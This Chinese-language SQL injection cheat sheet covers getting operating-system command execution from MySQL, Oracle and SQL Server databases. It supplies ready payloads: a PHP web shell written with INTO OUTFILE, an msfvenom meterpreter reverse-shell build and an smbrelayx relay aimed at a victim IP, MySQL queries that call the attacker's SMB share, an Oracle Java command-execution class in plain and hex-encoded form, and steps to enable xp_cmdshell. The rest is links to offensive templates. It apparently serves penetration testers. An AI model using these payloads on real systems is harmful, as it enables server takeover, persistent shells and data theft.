###  执行系统命令 {docsify-ignore-all}

执行系统命令是SQL注入的主要目标之一，这有助于完全控制主机操作系统。这可能通过直接执行命令，修改现有数据以在网页上放置shell或者利用数据库中的隐藏功能来实现。

#### MySQL



| 描述   |      语句     |  
|----------|:-------------:|
| 命令执行（PHP）  |      SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'    |  
| 使用MySQL CLI Access执行命令   |      [https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)     |  



SMB中继外壳

Requires

* [Metasploit](https://www.metasploit.com/) 
* [smbrelayx](https://github.com/CoreSecurity/impacket)



##### 生成反向shell有效负载

```code
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443  -f exe > reverse_shell.exe
```

#####  生成一个侦听器来传递反向shell

```code
smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse_shell.exe

```

##### 执行下面的任何一个MySQL查询来调用监听器

```code
select load_file('\\\\YOUR.IP.GOES.HERE\\aa');
select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);
select 'netspi' into dumpfile '\\\\YOUR.IP.GOES.HERE\\aa';
select 'netspi' into outfile '\\\\YOUR.IP.GOES.HERE\\aa';
load data infile '\\\\YOUR.IP.GOES.HERE\\aa' into table database.table_name;

```

有关更多信息，请参见[此处](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)

#### Oracle

如果安装了[Java](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)，可用于执行命令

| 描述   |      语句     |  
|----------|:-------------:|
| 创建Java类   |      /\* create Java class \*/  <br /> `BEGIN EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};'; END; ` <br />/<br />  `BEGIN  EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';'; END;  ` <br />/ <br />/\* run OS command \*/ <br /> ` SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;`     |  
| 创建Java类（十六进制编码）   |      /\* create Java class \*/<br />SELECT TO\_CHAR(dbms\_xmlquery.getxml('declare PRAGMA AUTONOMOUS\_TRANSACTION; <br />begin execute immediate utl\_raw.cast\_to\_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70<br />696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696<br />320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b42756<br />66665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d526561646572285<br />2756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e6720737<br />4656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d73746<br />56d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b726574757<br />26e20652e746f537472696e6728293b7d7d7d'')); <br />SEXECUTE IMMEDIATE utl\_raw.cast\_to\_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776<br />e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a<br />617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual <br />/\* run OS command \*/<br />SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;     |  
 
#### SQL Server


| 名称   |      语句     |  
|----------|:-------------:|
| xp\_cmdshell   |      \-\- Enable show advanced options <br />sp\_configure 'show advanced options', 1 <br />RECONFIGURE <br />GO  <br />\-\- Enable xp\_cmdshell <br />sp\_configure 'xp_cmdshell', 1 <br />RECONFIGURE <br />GO <br />EXEC xp\_cmdshell 'net user'     |  
| 写入注册表自动运行  |      [https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/](https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/) <br /> [https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e](https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e)  |  
| 写入文件自动运行   |      [https://blog.netspi.com/how-to-hack-database-links-in-sql-server/](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)    |  
|Agent Job  |      [https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution](https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution)     |  
| 存储过程中的SQL注入   |      [https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/](https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/)     |  
| CLR组件 |      [https://blog.netspi.com/attacking-sql-server-clr-assemblies/](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)     |  
| 自定义扩展存储过程  |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp)    |  



##### TSQL

| 名称   |      语句     |  
|----------|:-------------:|
| ActiveX Javascript Agent Job   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql)     |  
| ActiveX VBScript Agent Job   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql)     |  
| cmdexec Agent Job   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql)     |  
| Powershell Agent Job   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql)    |  
| 自定义命令行shell    |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp)     |  
| OLE自动化对象   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql)     |  
| OPENROWSET   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql)     |  
| Python   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql)     |  
| R   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql)     |  
| xp_cmdshell proxy   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql)     |  
















